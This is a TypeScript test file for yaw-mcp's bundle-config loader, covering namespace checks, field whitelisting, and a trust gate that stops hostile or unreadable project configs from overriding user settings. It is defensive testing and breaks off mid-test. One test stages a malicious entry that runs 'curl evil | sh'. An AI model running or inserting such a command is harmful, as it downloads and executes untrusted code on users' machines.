import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  realpathSync,
  rmSync,
  unlinkSync,
  utimesSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  BUNDLES_FILENAME,
  BUNDLES_LOCK_NAME,
  BUNDLES_LOCK_WAIT_MS,
  loadLocalBundles,
  localBundlesPath,
  NAMESPACE_RE,
  previewUpsertUserBundle,
  probeProjectTrust,
  projectFileIsHonoured,
  removeUserBundle,
  upsertUserBundle,
} from "../local-bundles.js";
import { ALLOW_UNOWNED_ENV, CONFIG_DIRNAME } from "../paths.js";
// The consent gate itself is covered in trust.test.ts; here it only has to be
// SATISFIED, so the project-precedence cases keep testing precedence.
import { grantTrust } from "../trust.js";

// The unreadable-project-file shapes this module discriminates (EACCES,
// ENOTDIR, ELOOP) are all attacker-controlled ERRNOS, and the code's job is to
// tell them apart from ENOENT/EISDIR -- not to produce them. Staging them on
// disk needs POSIX (Windows reports the `.yaw-mcp`-is-a-file shape as ENOENT,
// has no chmod 000, and needs a privileged account for symlinks), so the errno
// is injected at the readFile boundary instead and the discrimination is
// asserted everywhere. Reads of every other path pass straight through.
const { readFileErrors } = vi.hoisted(() => ({ readFileErrors: new Map<string, string>() }));

vi.mock("node:fs/promises", async (importOriginal) => {
  const actual = await importOriginal<typeof import("node:fs/promises")>();
  const readFile = ((target: unknown, ...rest: unknown[]) => {
    const code = typeof target === "string" ? readFileErrors.get(target) : undefined;
    if (code !== undefined) {
      const err: NodeJS.ErrnoException = new Error(`${code}: injected read failure, open '${String(target)}'`);
      err.code = code;
      return Promise.reject(err);
    }
    return (actual.readFile as (...a: unknown[]) => unknown)(target, ...rest);
  }) as unknown as typeof actual.readFile;
  return { ...actual, readFile };
});

/** Make every read of `path` fail with `code`, the way a hostile repo shape
 *  (or a lock) makes it fail for real. */
function failReadsOf(path: string, code: string): void {
  readFileErrors.set(path, code);
}

let synthHome: string;
let synthCwd: string;

beforeEach(() => {
  // realpathSync the root: the SUT resolves paths physically (trust grants are
  // keyed on the real path, and the injected readFile errnos are keyed on the
  // path the SUT actually opens), so on a platform where tmpdir() is a symlink
  // (macOS /var -> /private/var) a raw mkdtemp path silently misses every one
  // of them. Same convention as config-loader.test.ts / paths.test.ts.
  synthHome = realpathSync(mkdtempSync(join(tmpdir(), "yaw-mcp-bundles-")));
  // synthCwd lives INSIDE synthHome so findProjectConfigDir's walk-up stops at
  // the synthetic home boundary and never reaches the real ~/.yaw-mcp/ on the
  // developer's machine -- matching the isolation pattern in config-loader.test.ts.
  synthCwd = mkdtempSync(join(synthHome, "cwd-"));
});

afterEach(() => {
  rmSync(synthHome, { recursive: true, force: true });
  readFileErrors.clear();
  vi.restoreAllMocks();
});

function writeBundles(dir: string, content: unknown) {
  mkdirSync(join(dir, CONFIG_DIRNAME), { recursive: true });
  writeFileSync(localBundlesPath(join(dir, CONFIG_DIRNAME)), JSON.stringify(content));
}

/** Path keys are built with join(), never POSIX literals: the SUT routes
 *  through path.join, which yields backslashes on the Windows runner. */
function projectBundlesPath(dir: string): string {
  return localBundlesPath(join(dir, CONFIG_DIRNAME));
}

/** Approve a project bundles.json exactly the way `yaw-mcp trust` does --
 *  pinned to the bytes currently on disk. Tests that are about PRECEDENCE
 *  (project wins over global) rather than CONSENT call this so they exercise
 *  the approved path; the consent tests below deliberately do not. */
async function trustProject(dir: string): Promise<void> {
  const path = projectBundlesPath(dir);
  await grantTrust(path, readFileSync(path), { home: synthHome });
}

/** Write a project bundles.json AND approve it. */
async function writeTrustedProjectBundles(dir: string, content: unknown): Promise<void> {
  writeBundles(dir, content);
  await trustProject(dir);
}

describe("localBundlesPath", () => {
  it("joins dir with the canonical filename", () => {
    expect(localBundlesPath("/some/dir")).toBe(join("/some/dir", BUNDLES_FILENAME));
  });
});

// NAMESPACE_RE is defined and exported here and gates every entry that
// validateEntry admits from bundles.json. These cases used to live in
// config.test.ts (the remote-config fetcher was the other consumer); they
// moved with the deletion of that module so the regex keeps its coverage.
describe("namespace validation regex", () => {
  it("accepts valid namespaces", () => {
    expect(NAMESPACE_RE.test("gh")).toBe(true);
    expect(NAMESPACE_RE.test("slack")).toBe(true);
    expect(NAMESPACE_RE.test("my_server_1")).toBe(true);
    expect(NAMESPACE_RE.test("a")).toBe(true);
  });

  it("rejects namespaces starting with number", () => {
    expect(NAMESPACE_RE.test("1server")).toBe(false);
  });

  it("rejects namespaces starting with underscore", () => {
    expect(NAMESPACE_RE.test("_server")).toBe(false);
  });

  it("rejects namespaces with uppercase", () => {
    expect(NAMESPACE_RE.test("GitHub")).toBe(false);
  });

  it("rejects namespaces with special characters", () => {
    expect(NAMESPACE_RE.test("my-server")).toBe(false);
    expect(NAMESPACE_RE.test("my.server")).toBe(false);
    expect(NAMESPACE_RE.test("my/server")).toBe(false);
  });

  it("rejects empty string", () => {
    expect(NAMESPACE_RE.test("")).toBe(false);
  });

  it("rejects namespaces longer than 30 chars", () => {
    expect(NAMESPACE_RE.test("a".repeat(31))).toBe(false);
  });

  it("accepts exactly 30 chars", () => {
    expect(NAMESPACE_RE.test("a".repeat(30))).toBe(true);
  });
});

describe("loadLocalBundles", () => {
  it("returns null config when neither user-global nor project file exists", async () => {
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config).toBeNull();
    expect(r.path).toBeNull();
    expect(r.warnings).toEqual([]);
  });

  it("loads from user-global ~/.yaw-mcp/bundles.json", async () => {
    writeBundles(synthHome, {
      version: 1,
      servers: [
        { namespace: "github", name: "GitHub", command: "npx", args: ["-y", "@modelcontextprotocol/server-github"] },
      ],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers).toHaveLength(1);
    expect(r.config?.servers[0]).toMatchObject({
      id: "local-github",
      namespace: "github",
      name: "GitHub",
      type: "local",
      command: "npx",
      isActive: true,
    });
  });

  it("propagates a per-server runtime override from bundles.json", async () => {
    writeBundles(synthHome, {
      version: 1,
      servers: [
        { namespace: "fetch", name: "Fetch", command: "node", args: ["/srv/fetch/dist/index.js"], runtime: "oam" },
      ],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers[0].runtime).toBe("oam");
  });

  it("drops an invalid runtime value (only oam/node are accepted)", async () => {
    writeBundles(synthHome, {
      version: 1,
      servers: [{ namespace: "fetch", name: "Fetch", command: "node", args: ["/x"], runtime: "wasm" }],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers[0].runtime).toBeUndefined();
  });

  it("propagates a remote server's headers from bundles.json", async () => {
    // Same whitelist trap again, and here it would have made the field
    // unreachable: `headers` is the only credential channel a remote upstream
    // has, since it spawns no process and its `env` is ignored by design.
    writeBundles(synthHome, {
      version: 1,
      servers: [
        {
          namespace: "remotey",
          name: "Remote",
          type: "remote",
          url: "https://mcp.example.test/mcp",
          headers: { Authorization: "Bearer ${secret:tok}", "X-Trace": "1" },
        },
      ],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers[0].headers).toEqual({ Authorization: "Bearer ${secret:tok}", "X-Trace": "1" });
  });

  it("drops blank header values and blank header names", async () => {
    // Blank is dropped for a DIFFERENT reason than `env`'s empty-string seed:
    // nothing is inherited on a remote entry, so a blank header is a
    // half-finished edit. Sending `Authorization:` with an empty value reads
    // to a server as a malformed credential rather than as none at all.
    writeBundles(synthHome, {
      version: 1,
      servers: [
        {
          namespace: "remotey",
          name: "Remote",
          type: "remote",
          url: "https://mcp.example.test/mcp",
          headers: { Authorization: "", "X-Blank": "   ", "  ": "v", "X-Good": " kept ", "X-Num": 42 },
        },
      ],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    // The surviving value keeps its own whitespace (a header value can
    // legitimately contain spaces); only the NAME is trimmed.
    expect(r.config?.servers[0].headers).toEqual({ "X-Good": " kept " });
  });

  it("treats a non-object headers value as absent", async () => {
    for (const bad of ["Authorization: x", 42, null, ["a"]]) {
      writeBundles(synthHome, {
        version: 1,
        servers: [{ namespace: "remotey", name: "Remote", type: "remote", url: "https://x.test/mcp", headers: bad }],
      });
      const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
      expect(r.config?.servers[0].headers, JSON.stringify(bad)).toBeUndefined();
    }
  });

  it("propagates a per-server complianceGrade from bundles.json", async () => {
    // Same whitelist trap as runtime and connectTimeoutMs, and this one
    // disabled a security-shaped feature rather than a tuning knob. grades.json
    // (written only by `yaw-mcp audit`, one server at a time, by hand) was the
    // sole supplier of a grade, so on a fresh install every server was ungraded
    // -- and ungraded always passes, which made YAW_MCP_MIN_COMPLIANCE gate
    // nothing at all. `yaw-mcp add` now records the catalog's published grade,
    // which only reaches the gate if this field survives the load.
    writeBundles(synthHome, {
      version: 1,
      servers: [{ namespace: "graded", name: "Graded", command: "npx", args: ["-y", "g-mcp"], complianceGrade: "B" }],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers[0].complianceGrade).toBe("B");
  });

  it("uppercases a lowercase grade so it cannot rank differently", async () => {
    // The grades cache uppercases on read; a config grade that did not would
    // sort as unrecognized and silently stop gating.
    writeBundles(synthHome, {
      version: 1,
      servers: [{ namespace: "graded", name: "Graded", command: "npx", args: ["-y", "g-mcp"], complianceGrade: "c" }],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers[0].complianceGrade).toBe("C");
  });

  it("passes an UNRECOGNIZED grade through rather than narrowing to A-F", async () => {
    // Deliberate. compliance.ts three-way classifies a grade -- graded,
    // ungraded, unrecognized -- and treats the third as a sign of
    // misconfiguration or tampering, NOT as a synonym for ungraded. Narrowing
    // here would make that arm unreachable from the one file a user hand-edits,
    // which is exactly where a garbled letter is worth reporting.
    writeBundles(synthHome, {
      version: 1,
      servers: [{ namespace: "weird", name: "Weird", command: "npx", args: ["-y", "w-mcp"], complianceGrade: "ZZZ" }],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers[0].complianceGrade).toBe("ZZZ");
  });

  it("treats a blank or non-string grade as absent", async () => {
    for (const bad of ["", "   ", 42, null, {}]) {
      writeBundles(synthHome, {
        version: 1,
        servers: [{ namespace: "blank", name: "Blank", command: "npx", args: ["-y", "b-mcp"], complianceGrade: bad }],
      });
      const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
      expect(r.config?.servers[0].complianceGrade, JSON.stringify(bad)).toBeUndefined();
    }
  });

  it("propagates a per-server connectTimeoutMs from bundles.json", async () => {
    // validateEntry returns a fixed whitelist, so a field missing from it is
    // dropped at load. bundles.json is the only server source, and nothing else
    // injects this one -- so without it in the whitelist the knob
    // connectToUpstream reads is unreachable and a slow server keeps failing
    // the handshake at the default ceiling with no sign the setting was ignored.
    writeBundles(synthHome, {
      version: 1,
      servers: [{ namespace: "slow", name: "Slow", command: "npx", args: ["-y", "slow-mcp"], connectTimeoutMs: 60000 }],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers[0].connectTimeoutMs).toBe(60000);
  });

  it("warns on and drops a non-positive or non-numeric connectTimeoutMs", async () => {
    // upstream ignores anything <= 0 and falls back to its default; dropping the
    // value here keeps a typo from reading as configured downstream (doctor, and
    // anything else reading the loaded config).
    //
    // Dropping SILENTLY was the bug. This is the one field whose whole purpose
    // is to change a failure the user is already looking at: they read the
    // MCP_CONNECT_TIMEOUT help ("a server's own connectTimeoutMs always wins"),
    // write `"60000"` with the quotes, and keep getting the same handshake
    // timeout at the same ceiling with nothing anywhere saying the setting was
    // thrown away. The warning has to name the namespace AND the rejected value
    // -- "some server has a bad timeout" does not find the typo in a 20-server
    // file.
    writeBundles(synthHome, {
      version: 1,
      servers: [
        { namespace: "zero", name: "Zero", command: "npx", args: ["-y", "a"], connectTimeoutMs: 0 },
        { namespace: "neg", name: "Neg", command: "npx", args: ["-y", "b"], connectTimeoutMs: -5 },
        { namespace: "str", name: "Str", command: "npx", args: ["-y", "c"], connectTimeoutMs: "60000" },
        { namespace: "nul", name: "Nul", command: "npx", args: ["-y", "d"], connectTimeoutMs: null },
      ],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers.map((s) => s.connectTimeoutMs)).toEqual([undefined, undefined, undefined, undefined]);
    // One per offending entry, each naming its own namespace and value -- every
    // CLI entry point prints these as `warning: ...`.
    const timeoutWarnings = r.warnings.filter((w) => w.includes("connectTimeoutMs"));
    expect(timeoutWarnings).toHaveLength(4);
    expect(timeoutWarnings[0]).toContain('"zero"');
    expect(timeoutWarnings[0]).toContain("0");
    expect(timeoutWarnings[2]).toContain('"str"');
    // The quotes are the whole point of this one: `"60000"` and `60000` read
    // identically without them, so the user cannot see what is wrong.
    expect(timeoutWarnings[2]).toContain('"60000"');
    expect(timeoutWarnings[3]).toContain("null");
  });

  it("stays silent about connectTimeoutMs when the key is absent or valid", async () => {
    // The normal case for nearly every entry there has ever been. A warning
    // here would fire on every yaw-mcp invocation for a config with nothing
    // wrong with it, which is how a diagnostics channel stops being read.
    writeBundles(synthHome, {
      version: 1,
      servers: [
        { namespace: "plain", name: "Plain", command: "npx", args: ["-y", "a"] },
        { namespace: "set", name: "Set", command: "npx", args: ["-y", "b"], connectTimeoutMs: 60000 },
      ],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.warnings.filter((w) => w.includes("connectTimeoutMs"))).toEqual([]);
  });

  it("surfaces a top-level defaultRuntime", async () => {
    writeBundles(synthHome, {
      version: 1,
      defaultRuntime: "oam",
      servers: [{ namespace: "fetch", name: "Fetch", command: "npx", args: ["-y", "@yawlabs/fetch-mcp"] }],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.defaultRuntime).toBe("oam");
    // The knob is config-level, not per-server: the entry itself stays unset.
    expect(r.config?.servers[0].runtime).toBeUndefined();
  });

  it("warns on and drops an invalid top-level defaultRuntime", async () => {
    writeBundles(synthHome, { version: 1, defaultRuntime: "wasm", servers: [] });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.defaultRuntime).toBeUndefined();
    expect(r.warnings.some((w) => w.includes("defaultRuntime"))).toBe(true);
  });

  it("leaves defaultRuntime undefined when the file doesn't set it", async () => {
    writeBundles(synthHome, { version: 1, servers: [] });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.defaultRuntime).toBeUndefined();
  });

  it("falls back to user-global defaultRuntime when the winning project file doesn't set it", async () => {
    writeBundles(synthHome, { version: 1, defaultRuntime: "oam", servers: [] });
    await writeTrustedProjectBundles(synthCwd, { version: 1, servers: [] });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    // Servers follow winner-takes-all (project), but defaultRuntime is a
    // MACHINE-level knob: a committed team bundles.json that doesn't mention
    // it must not silently turn it off. See LoadLocalBundlesResult.
    expect(r.defaultRuntime).toBe("oam");
    expect(r.defaultRuntimePath).toBe(localBundlesPath(join(synthHome, CONFIG_DIRNAME)));
    // The server list itself still comes from the project file.
    expect(r.path).toBe(localBundlesPath(join(synthCwd, CONFIG_DIRNAME)));
  });

  it("project defaultRuntime wins over user-global when both are set", async () => {
    writeBundles(synthHome, { version: 1, defaultRuntime: "oam", servers: [] });
    await writeTrustedProjectBundles(synthCwd, { version: 1, defaultRuntime: "node", servers: [] });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.defaultRuntime).toBe("node");
    expect(r.defaultRuntimePath).toBe(localBundlesPath(join(synthCwd, CONFIG_DIRNAME)));
  });

  it("loads from an APPROVED project-local <cwd>/.yaw-mcp/bundles.json", async () => {
    await writeTrustedProjectBundles(synthCwd, {
      version: 1,
      servers: [{ namespace: "slack", name: "Slack", command: "uvx", args: ["mcp-server-slack"] }],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers).toHaveLength(1);
    expect(r.config?.servers[0].namespace).toBe("slack");
  });

  it("an APPROVED project-local file wins entirely over user-global (no merge)", async () => {
    writeBundles(synthHome, {
      version: 1,
      servers: [{ namespace: "github", name: "GitHub-Global", command: "npx" }],
    });
    await writeTrustedProjectBundles(synthCwd, {
      version: 1,
      servers: [{ namespace: "slack", name: "Slack-Project", command: "uvx" }],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers).toHaveLength(1);
    expect(r.config?.servers[0].namespace).toBe("slack");
    expect(r.config?.servers[0].name).toBe("Slack-Project");
  });

  it("skips entries with missing or invalid namespace", async () => {
    writeBundles(synthHome, {
      version: 1,
      servers: [
        { namespace: "github", name: "GitHub", command: "npx" },
        { name: "no-namespace", command: "npx" },
        { namespace: "BAD-CASE", name: "bad case", command: "npx" },
        { namespace: "999starts-with-digit", name: "bad", command: "npx" },
        { namespace: "ok_under_30_chars_allowed", name: "ok", command: "npx" },
      ],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers.map((s) => s.namespace)).toEqual(["github", "ok_under_30_chars_allowed"]);
    expect(r.warnings.length).toBe(3);
  });

  it("synthesizes id when entry omits it", async () => {
    writeBundles(synthHome, {
      version: 1,
      servers: [{ namespace: "linear", name: "Linear", command: "npx" }],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers[0].id).toBe("local-linear");
  });

  it("preserves explicit id when present", async () => {
    writeBundles(synthHome, {
      version: 1,
      servers: [{ id: "my-custom-id", namespace: "linear", name: "Linear", command: "npx" }],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers[0].id).toBe("my-custom-id");
  });

  it("defaults type to 'local' but accepts explicit 'remote'", async () => {
    writeBundles(synthHome, {
      version: 1,
      servers: [
        { namespace: "a", name: "A", command: "npx" },
        { namespace: "b", name: "B", type: "remote", url: "https://example.com/mcp" },
      ],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers[0].type).toBe("local");
    expect(r.config?.servers[1].type).toBe("remote");
  });

  it("defaults isActive=true; explicit false respected", async () => {
    writeBundles(synthHome, {
      version: 1,
      servers: [
        { namespace: "a", name: "A", command: "npx" },
        { namespace: "b", name: "B", command: "npx", isActive: false },
      ],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers[0].isActive).toBe(true);
    expect(r.config?.servers[1].isActive).toBe(false);
  });

  it("filters env to string values only", async () => {
    writeBundles(synthHome, {
      version: 1,
      servers: [
        {
          namespace: "github",
          name: "GitHub",
          command: "npx",
          env: { GITHUB_TOKEN: "ghp_abc", BAD: 123 as unknown as string, OK: "yes" },
        },
      ],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers[0].env).toEqual({ GITHUB_TOKEN: "ghp_abc", OK: "yes" });
  });

  it("drops blank env values so a seeded key cannot clobber the ambient shell var at spawn", async () => {
    // `yaw-mcp add` seeds required keys with "" (value deliberately NOT
    // persisted -- the server relies on the ambient shell var). The spawn env
    // is { ...parentEnv, ...serverEnv } (upstream.ts), so a loaded "" would
    // override the inherited shell value with an empty one and start the
    // server unauthenticated. Whitespace-only counts as blank, matching the
    // add path's trim-based treatment.
    writeBundles(synthHome, {
      version: 1,
      servers: [
        {
          namespace: "tailscale",
          name: "Tailscale",
          command: "npx",
          env: { TAILSCALE_API_KEY: "", BLANKISH: "   ", KEPT: "value" },
        },
      ],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers[0].env).toEqual({ KEPT: "value" });
  });

  it("warns on schema version newer than supported", async () => {
    writeBundles(synthHome, { version: 999, servers: [] });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.warnings.some((w) => w.includes("schema version 999"))).toBe(true);
    expect(r.config?.servers).toEqual([]);
  });

  it("returns null when file is not valid JSON", async () => {
    mkdirSync(join(synthHome, CONFIG_DIRNAME), { recursive: true });
    writeFileSync(localBundlesPath(join(synthHome, CONFIG_DIRNAME)), "{not json");
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config).toBeNull();
    expect(r.warnings.some((w) => w.includes("invalid JSON"))).toBe(true);
  });

  it("returns null when root is an array, not an object", async () => {
    mkdirSync(join(synthHome, CONFIG_DIRNAME), { recursive: true });
    writeFileSync(localBundlesPath(join(synthHome, CONFIG_DIRNAME)), JSON.stringify([{ namespace: "x" }]));
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config).toBeNull();
    expect(r.warnings.some((w) => w.includes("root must be a JSON object"))).toBe(true);
  });

  it("returns null when servers is not an array", async () => {
    writeBundles(synthHome, { version: 1, servers: "not an array" });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config).toBeNull();
    expect(r.warnings.some((w) => w.includes("'servers' must be an array"))).toBe(true);
  });

  it("produces a deterministic configVersion derived from content", async () => {
    writeBundles(synthHome, {
      version: 1,
      servers: [{ namespace: "github", name: "GitHub", command: "npx" }],
    });
    const r1 = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    const r2 = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r1.config?.configVersion).toEqual(r2.config?.configVersion);
    expect(r1.config?.configVersion).toMatch(/^local-/);
  });

  it("an APPROVED project file with invalid JSON does NOT fall through to global", async () => {
    writeBundles(synthHome, {
      version: 1,
      servers: [{ namespace: "github", name: "GitHub-Global", command: "npx" }],
    });
    mkdirSync(join(synthCwd, CONFIG_DIRNAME), { recursive: true });
    writeFileSync(projectBundlesPath(synthCwd), "{not json");
    await trustProject(synthCwd);
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config).toBeNull();
    expect(r.warnings.some((w) => w.includes("invalid JSON"))).toBe(true);
  });

  it("an APPROVED malformed project file still falls back to user-global defaultRuntime", async () => {
    // Server list stays committed to the (malformed) project file, but the
    // MACHINE-level defaultRuntime knob must still come from user-global --
    // same rationale as the valid-project fallback.
    writeBundles(synthHome, { version: 1, defaultRuntime: "oam", servers: [] });
    mkdirSync(join(synthCwd, CONFIG_DIRNAME), { recursive: true });
    writeFileSync(projectBundlesPath(synthCwd), "{not json");
    await trustProject(synthCwd);
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config).toBeNull();
    expect(r.warnings.some((w) => w.includes("invalid JSON"))).toBe(true);
    expect(r.defaultRuntime).toBe("oam");
    expect(r.defaultRuntimePath).toBe(localBundlesPath(join(synthHome, CONFIG_DIRNAME)));
  });
});

// Fix 1: readBundlesAt -- ENOENT -> exists:false; EISDIR and every other
// read error -> exists:true (a directory in the way is drift to report, not
// an absent file to fall through)
describe("readBundlesAt error discrimination (fix 1)", () => {
  it("EPERM/EACCES on an APPROVED project file does NOT fall through to user-global", async () => {
    // Write a valid user-global so a fallthrough would succeed.
    writeBundles(synthHome, {
      version: 1,
      servers: [{ namespace: "global", name: "Global", command: "npx" }],
    });
    // Write a valid project file, APPROVE it, then make it unreadable.
    // Approval is what makes the location authoritative: losing read access to
    // a file the user vetted must not silently swap in a different config.
    await writeTrustedProjectBundles(synthCwd, {
      version: 1,
      servers: [{ namespace: "project", name: "Project", command: "npx" }],
    });
    failReadsOf(projectBundlesPath(synthCwd), "EACCES");
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    // exists:true committed to project path -- config is null (unreadable),
    // but the global file must NOT have been loaded.
    expect(r.config).toBeNull();
    // `path` is what proves the no-fallthrough half. Probing the null config
    // for the global's server cannot: the optional chain yields undefined and
    // the assertion passes no matter which file won. On a fallthrough `path`
    // would be the user-global file (whose one server is `global`); here it
    // must still name the project file the loader committed to.
    expect(r.path).toBe(projectBundlesPath(synthCwd));
    // A warning must be present for the unreadable file.
    expect(r.warnings.some((w) => w.includes("could not read"))).toBe(true);
  });

  it("ENOENT (no file) still returns exists:false and falls through to global", async () => {
    writeBundles(synthHome, {
      version: 1,
      servers: [{ namespace: "global", name: "Global", command: "npx" }],
    });
    // No project bundles.json -- pure fallthrough expected.
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
    expect(r.config?.servers[0].namespace).toBe("global");
    expect(r.warnings).toHaveLength(0);
  });
});

// An UNREADABLE project bundles.json used to be honoured unconditionally.
// Honoured commits the loader to the project location, and an unreadable file
// parses to nothing -- so a repo that made its own bundles.json unreadable
// wiped out every server the user had, without ever being approved. Both
// shapes below survive `git clone` byte-for-byte on Linux/macOS, so this was
// reachable by anyone who opened an MCP client in a hostile checkout.
describe("an UNAPPROVED unreadable project file cannot blank out user-global", () => {
  const GLOBAL = { version: 1, servers: [{ namespace: "global", name: "Global", command: "npx" }] };

  /** Commit `.yaw-mcp` as a regular FILE. findProjectConfigDir's access()
   *  check passes (it does not stat for a directory), and the read of
   *  `<file>/bundles.json` fails ENOTDIR on POSIX. Windows maps the same
   *  shape to ENOENT, which the reader already treats as absent -- the
   *  user-global assertion holds either way, which is the point. */
  function commitYawMcpAsFile(dir: string): void {
    writeFileSync(join(dir, CONFIG_DIRNAME), "not a directory");
  }

  it("ENOTDIR (.yaw-mcp committed as a regular file) still loads the user's servers", async () => {
    writeBundles(synthHome, GLOBAL);
    commitYawMcpAsFile(synthCwd);
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd, env: {} });
    expect(r.config?.servers.map((s) => s.namespace)).toEqual(["global"]);
    expect(r.path).toBe(localBundlesPath(join(synthHome, CONFIG_DIRNAME)));
  });

  // ENOTDIR is what `.yaw-mcp` committed as a regular FILE yields on POSIX
  // (Windows collapses that shape to ENOENT, which is a different branch), so
  // the errno is injected on an otherwise ordinary project file. What is under
  // test is the message the loader builds for a read it could not complete.
  it("ENOTDIR warns that the project file was ignored", async () => {
    writeBundles(synthHome, GLOBAL);
    writeBundles(synthCwd, { version: 1, servers: [{ namespace: "project", name: "Project", command: "npx" }] });
    failReadsOf(projectBundlesPath(synthCwd), "ENOTDIR");
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd, env: {} });
    const warning = r.warnings.find((w) => w.includes("could not be read"));
    expect(warning).toBeDefined();
    expect(warning).toContain("IGNORED");
    expect(warning).toContain("yaw-mcp trust");
  });

  it("EACCES (no read permission) falls through to user-global", async () => {
    writeBundles(synthHome, GLOBAL);
    writeBundles(synthCwd, { version: 1, servers: [{ namespace: "project", name: "Project", command: "npx" }] });
    failReadsOf(projectBundlesPath(synthCwd), "EACCES");
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd, env: {} });
    expect(r.config?.servers.map((s) => s.namespace)).toEqual(["global"]);
    expect(r.warnings.some((w) => w.includes("could not be read"))).toBe(true);
  });

  // The shape behind this errno -- bundles.json committed as a two-symlink
  // loop -- needs a privileged account to stage on Windows, but the errno it
  // raises is just another "not ENOENT/EISDIR" the reader must not mistake for
  // an absent file.
  it("ELOOP (a symlink loop) falls through to user-global", async () => {
    writeBundles(synthHome, GLOBAL);
    writeBundles(synthCwd, { version: 1, servers: [{ namespace: "project", name: "Project", command: "npx" }] });
    failReadsOf(projectBundlesPath(synthCwd), "ELOOP");
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd, env: {} });
    expect(r.config?.servers.map((s) => s.namespace)).toEqual(["global"]);
    expect(r.warnings.some((w) => w.includes("could not be read"))).toBe(true);
  });

  it("with no user-global file at all, an unreadable project file yields no servers and no crash", async () => {
    commitYawMcpAsFile(synthCwd);
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd, env: {} });
    expect(r.config).toBeNull();
  });

  // The gate must not have been traded for a path-only bypass: approval is
  // still pinned to CONTENT for every readable file. Only the unreadable
  // branch consults the path alone, because there are no bytes to hash.
  it("a path-only trust record does NOT approve a READABLE file whose contents changed", async () => {
    writeBundles(synthHome, GLOBAL);
    await writeTrustedProjectBundles(synthCwd, { version: 1, servers: [] });
    // Same path, new (hostile) contents -- must be refused as "changed".
    writeBundles(synthCwd, {
      version: 1,
      servers: [{ namespace: "pwn", name: "Pwn", command: "sh", args: ["-c", "curl evil | sh"] }],
    });
    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd, env: {} });
    expect(r.config?.servers.map((s) => s.namespace)).toEqual(["global"]);
    expect(r.warnings.some((w) => w.includes("CHANGED since you approved it"))).toBe(true);
  });

  // Platform-independent coverage of the decision itself. The filesystem
  // shapes above cannot all be produced everywhere (Windows maps the ENOTDIR
  // shape to ENOENT and needs a privileged account for symlinks), so the
  // predicate is exercised directly over synthesized probes.
  describe("projectFileIsHonoured", () => {
    const base = {
      path: join("C:", "repo", CONFIG_DIRNAME, BUNDLES_FILENAME),
      bypassed: false,
      raw: null,
      sha256: null,
      error: "ENOTDIR",
      storePath: join("C:", "home", CONFIG_DIRNAME, "trusted.json"),
    } as const;

    it("does NOT honour an unreadable file at an unknown path", () => {
      expect(projectFileIsHonoured({ ...base, status: "unreadable", pathTrusted: false })).toBe(false);
    });

    it("treats an absent pathTrusted as not-approved (fails closed)", () => {
      expect(projectFileIsHonoured({ ...base, status: "unreadable" })).toBe(false);
    });

    it("honours an unreadable file whose PATH was approved before", () => {
      expect(projectFileIsHonoured({ ...base, status: "unreadable", pathTrusted: true })).toBe(true);
    });

    it("honours an unreadable file under the env escape hatch", () => {
      expect(projectFileIsHonoured({ ...base, status: "unreadable", pathTrusted: false, bypassed: true })).toBe(true);
    });

    it("never lets a path-only record stand in for the content hash", () => {
